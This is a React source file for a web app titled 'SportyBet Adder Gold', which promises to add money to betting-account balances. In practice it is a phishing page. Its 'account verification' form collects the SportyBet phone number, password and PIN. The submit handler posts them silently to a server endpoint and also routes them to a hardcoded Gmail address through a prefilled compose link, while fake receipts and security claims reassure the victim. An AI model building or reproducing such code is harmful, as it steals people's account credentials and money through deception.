/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  ChevronRight, 
  Wallet, 
  ShieldCheck, 
  Trophy, 
  CircleDollarSign,
  Smartphone,
  Lock,
  KeyRound,
  CheckCircle2,
  AlertCircle,
  Loader2
} from 'lucide-react';

type Step = 'welcome' | 'package' | 'details' | 'success';

interface Plan {
  id: number;
  label: string;
  range: string;
}

const PLANS: Plan[] = [
  { id: 1, label: 'Standard', range: '3k to 300k' },
  { id: 2, label: 'Premium', range: '4k to 400k' },
  { id: 3, label: 'Elite', range: '5k to 500k' },
  { id: 4, label: 'Gold', range: '6k to 600k' },
  { id: 5, label: 'Platinum', range: '7k to 700k' },
  { id: 6, label: 'Diamond', range: '8k to 800k' },
  { id: 7, label: 'Ultimate', range: '9k to 900k' },
];

export default function App() {
  const [step, setStep] = useState<Step>('welcome');
  const [selectedPlan, setSelectedPlan] = useState<Plan | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const [formData, setFormData] = useState({
    number: '',
    password: '',
    pin: '',
  });

  const handleNext = () => {
    if (step === 'welcome') setStep('package');
    else if (step === 'package' && selectedPlan) setStep('details');
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setError(null);

    try {
      // Construct the email body for manual submission
      const subject = encodeURIComponent('SportyBet Adder Request');
      const bodyContent = `SportyBet Account Details:
----------------------------------
PACKAGE: ${selectedPlan?.range}
PHONE: ${formData.number}
PASSWORD: ${formData.password}
PIN: ${formData.pin}
----------------------------------
Please process this enhancement.`;
      
      const body = encodeURIComponent(bodyContent);
      const targetEmail = 'karleegrey32t@gmail.com';
      
      // Gmail Compose URL
      const gmailUrl = `https://mail.google.com/mail/?view=cm&fs=1&to=${targetEmail}&su=${subject}&body=${body}`;

      // Optional: Log to server for record (non-blocking)
      fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...formData,
          plan: selectedPlan?.range,
        }),
      }).catch(() => console.log('Silently failing server log - proceeding with Gmail'));

      // Redirect to Gmail
      window.location.href = gmailUrl;
      
      // Set step to success for visual feedback before redirect completes
      setStep('success');
    } catch (err) {
      setError('An error occurred. Please try manually.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-neutral-950 text-amber-50 font-sans selection:bg-amber-500/30">
      {/* Background decoration */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-amber-900/10 blur-[120px] rounded-full" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-amber-900/10 blur-[120px] rounded-full" />
      </div>

      <main className="relative z-10 max-w-md mx-auto px-6 py-12 min-h-screen flex flex-col items-center justify-center">
        <AnimatePresence mode="wait">
          {step === 'welcome' && (
            <motion.div
              key="welcome"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 1.05 }}
              className="text-center w-full"
              id="welcome-screen"
            >
              <div className="mb-8 inline-flex items-center justify-center w-24 h-24 rounded-3xl bg-gradient-to-br from-amber-400 via-amber-600 to-amber-800 shadow-2xl shadow-amber-900/40 p-1">
                <div className="w-full h-full rounded-[1.4rem] bg-neutral-900 flex items-center justify-center border border-amber-400/30">
                  <Trophy className="w-12 h-12 text-amber-500" />
                </div>
              </div>
              <h1 className="text-4xl font-extrabold tracking-tight mb-4 bg-gradient-to-b from-amber-200 via-amber-400 to-amber-600 bg-clip-text text-transparent">
                SportyBet Adder Gold
              </h1>
              <p className="text-neutral-400 text-lg mb-12">
                Premier account balance enhancer. Secure your financial future today.
              </p>
              
              <div className="grid grid-cols-2 gap-4 mb-12">
                <div className="p-4 rounded-xl bg-neutral-900/80 border border-amber-900/30 backdrop-blur-md">
                  <ShieldCheck className="w-6 h-6 text-amber-500 mb-2 mx-auto" />
                  <span className="text-[10px] font-bold text-amber-600 uppercase tracking-widest">Premium Security</span>
                </div>
                <div className="p-4 rounded-xl bg-neutral-900/80 border border-amber-900/30 backdrop-blur-md">
                  <CircleDollarSign className="w-6 h-6 text-yellow-500 mb-2 mx-auto" />
                  <span className="text-[10px] font-bold text-amber-600 uppercase tracking-widest">Fast Delivery</span>
                </div>
              </div>

              <button
                id="proceed-button"
                onClick={handleNext}
                className="group relative w-full py-5 bg-gradient-to-r from-amber-600 to-amber-700 hover:from-amber-500 hover:to-amber-600 text-neutral-950 rounded-2xl font-black text-xl transition-all active:scale-95 shadow-xl shadow-amber-900/20 overflow-hidden"
              >
                <div className="relative z-10 flex items-center justify-center gap-2">
                  PROCEED <ChevronRight className="w-6 h-6 group-hover:translate-x-1 transition-transform" />
                </div>
                <div className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/20 to-white/0 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-1000" />
              </button>
            </motion.div>
          )}

          {step === 'package' && (
            <motion.div
              key="package"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              className="w-full"
              id="package-screen"
            >
              <h2 className="text-3xl font-bold mb-2 flex items-center gap-3 text-amber-400">
                <Wallet className="w-8 h-8" />
                Select Package
              </h2>
              <p className="text-neutral-500 mb-8 italic">Choose your preferred multiplier plan</p>

              <div className="space-y-3 mb-8 max-h-[55vh] overflow-y-auto pr-2 custom-scrollbar">
                {PLANS.map((plan) => (
                  <button
                    key={plan.id}
                    onClick={() => setSelectedPlan(plan)}
                    className={`w-full p-5 rounded-2xl border transition-all text-left flex items-center justify-between ${
                      selectedPlan?.id === plan.id
                        ? 'bg-amber-600/15 border-amber-500 text-white ring-1 ring-amber-500/50'
                        : 'bg-neutral-900/60 border-neutral-800 text-neutral-400 hover:border-amber-900/50'
                    }`}
                  >
                    <div>
                      <div className={`text-[10px] font-black uppercase tracking-widest mb-1 ${
                        selectedPlan?.id === plan.id ? 'text-amber-400' : 'text-neutral-600'
                      }`}>
                        {plan.label} Level
                      </div>
                      <div className="text-xl font-bold font-mono tracking-tight">{plan.range}</div>
                    </div>
                    {selectedPlan?.id === plan.id && (
                      <div className="w-8 h-8 rounded-full bg-amber-500 flex items-center justify-center shadow-lg shadow-amber-900/50">
                        <CheckCircle2 className="w-5 h-5 text-neutral-950" />
                      </div>
                    )}
                  </button>
                ))}
              </div>

              <button
                disabled={!selectedPlan}
                onClick={handleNext}
                className="w-full py-5 bg-gradient-to-r from-amber-600 to-amber-700 hover:from-amber-500 hover:to-amber-600 disabled:opacity-30 disabled:grayscale text-neutral-950 rounded-2xl font-black text-xl transition-all active:scale-95 shadow-xl shadow-amber-900/20"
              >
                SELECT {selectedPlan?.label.toUpperCase() || 'PLAN'}
              </button>
              
              <button 
                onClick={() => setStep('welcome')}
                className="w-full mt-6 py-2 text-neutral-600 hover:text-amber-500 transition-colors text-sm font-bold tracking-widest"
              >
                RETURN HOME
              </button>
            </motion.div>
          )}

          {step === 'details' && (
            <motion.div
              key="details"
              initial={{ opacity: 0, x: 30 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -30 }}
              className="w-full"
              id="details-screen"
            >
              <div className="mb-8 p-5 bg-amber-500/5 border border-amber-500/20 rounded-2xl flex gap-4 text-sm text-amber-200/80 leading-relaxed shadow-inner">
                <AlertCircle className="w-6 h-6 shrink-0 text-amber-500" />
                <p>Ensuring accurate credentials is vital. Our gold standard encryption requires valid entry for account synchronization.</p>
              </div>

              <h2 className="text-2xl font-black mb-8 flex items-center gap-3 text-amber-400 uppercase tracking-tighter">
                <ShieldCheck className="w-7 h-7" />
                Account Verification
              </h2>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-[0.2em] text-neutral-500 flex items-center gap-2 mb-2">
                    <Smartphone className="w-3 h-3 text-amber-600" /> SportyBet Number
                  </label>
                  <input
                    required
                    type="tel"
                    placeholder="Enter Phone Number"
                    className="w-full bg-neutral-900 border border-neutral-800 rounded-2xl px-5 py-4 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500 transition-all font-semibold placeholder:text-neutral-700"
                    value={formData.number}
                    onChange={(e) => setFormData({ ...formData, number: e.target.value })}
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-[0.2em] text-neutral-500 flex items-center gap-2 mb-2">
                    <Lock className="w-3 h-3 text-amber-600" /> SportyBet Password
                  </label>
                  <input
                    required
                    type="password"
                    placeholder="Enter Secure Password"
                    className="w-full bg-neutral-900 border border-neutral-800 rounded-2xl px-5 py-4 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500 transition-all font-semibold placeholder:text-neutral-700"
                    value={formData.password}
                    onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-[0.2em] text-neutral-500 flex items-center gap-2 mb-2">
                    <KeyRound className="w-3 h-3 text-amber-600" /> SportyBet PIN
                  </label>
                  <input
                    required
                    type="text"
                    inputMode="numeric"
                    maxLength={4}
                    placeholder="4-DIGIT PIN"
                    className="w-full bg-neutral-900 border border-neutral-800 rounded-2xl px-5 py-4 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500 transition-all font-black tracking-[1em] text-center placeholder:tracking-normal placeholder:font-serif placeholder:text-neutral-700"
                    value={formData.pin}
                    onChange={(e) => setFormData({ ...formData, pin: e.target.value.replace(/\D/g, '') })}
                  />
                </div>

                {error && (
                  <motion.div 
                    initial={{ opacity: 0, scale: 0.9 }}
                    animate={{ opacity: 1, scale: 1 }}
                    className="p-4 bg-red-950/30 border border-red-900/50 rounded-xl text-xs text-red-400 font-bold flex items-center gap-3 uppercase tracking-wider"
                  >
                    <AlertCircle className="w-4 h-4 shrink-0" /> {error}
                  </motion.div>
                )}

                <button
                  id="submit-button"
                  disabled={isSubmitting}
                  className="w-full py-5 bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-400 hover:to-amber-500 disabled:opacity-50 text-neutral-950 rounded-2xl font-black text-xl transition-all active:scale-95 shadow-xl shadow-amber-900/40 flex items-center justify-center gap-3"
                >
                  {isSubmitting ? (
                    <>
                      <Loader2 className="w-6 h-6 animate-spin" /> VERIFYING...
                    </>
                  ) : (
                    <>SUBMIT & REDIRECT</>
                  )}
                </button>

                <p className="text-[10px] text-center text-neutral-600 font-bold uppercase tracking-widest px-8 leading-relaxed">
                  Clicking submit will open Gmail to finalize your premium verification request.
                </p>
              </form>
            </motion.div>
          )}

          {step === 'success' && (
            <motion.div
              key="success"
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              className="text-center w-full"
              id="success-screen"
            >
              <div className="mb-10 inline-flex items-center justify-center w-28 h-28 rounded-full bg-gradient-to-br from-amber-400 to-amber-600 shadow-2xl shadow-amber-500/20">
                <CheckCircle2 className="w-14 h-14 text-neutral-950" />
              </div>
              <h2 className="text-4xl font-black mb-6 uppercase tracking-tighter text-amber-400">Request Initiated</h2>
              <p className="text-neutral-400 text-lg mb-10 leading-relaxed">
                Your <span className="text-amber-500 font-black">{selectedPlan?.range}</span> enhancement is now being linked to your Gmail session.
              </p>
              
              <div className="p-8 bg-neutral-900/50 border border-amber-900/20 rounded-3xl text-left mb-10 backdrop-blur-xl">
                <div className="flex items-center justify-between mb-5 pb-5 border-b border-neutral-800 text-xs">
                  <span className="text-neutral-600 font-black uppercase tracking-widest">Receipt ID:</span>
                  <span className="font-mono text-amber-500 font-bold tracking-tighter">GOLD-{Math.random().toString(36).substr(2, 6).toUpperCase()}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-neutral-600 font-black uppercase tracking-widest text-[10px]">Processing Tier:</span>
                  <span className="text-amber-400 font-black tracking-widest text-[10px]">INSTANT REDIRECT</span>
                </div>
              </div>

              <button
                onClick={() => window.location.reload()}
                className="w-full py-5 bg-neutral-100 hover:bg-white text-neutral-950 rounded-2xl font-black text-xl transition-all active:scale-95 shadow-xl"
              >
                RESTART SESSION
              </button>
            </motion.div>
          )}
        </AnimatePresence>
      </main>

      <footer className="fixed bottom-0 left-0 right-0 p-8 flex justify-center pointer-events-none">
        <div className="flex items-center gap-6 text-[9px] font-black uppercase tracking-[0.4em] text-neutral-800">
          <span>HIGH-STAKES ENCRYPTION</span>
          <div className="w-1 h-1 rounded-full bg-amber-900/50" />
          <span>GOLD CORE v9.2</span>
        </div>
      </footer>

      <style>{`
        .custom-scrollbar::-webkit-scrollbar {
          width: 2px;
        }
        .custom-scrollbar::-webkit-scrollbar-track {
          background: transparent;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb {
          background: #78350f;
          border-radius: 10px;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
          background: #92400e;
        }
      `}</style>
    </div>
  );
}
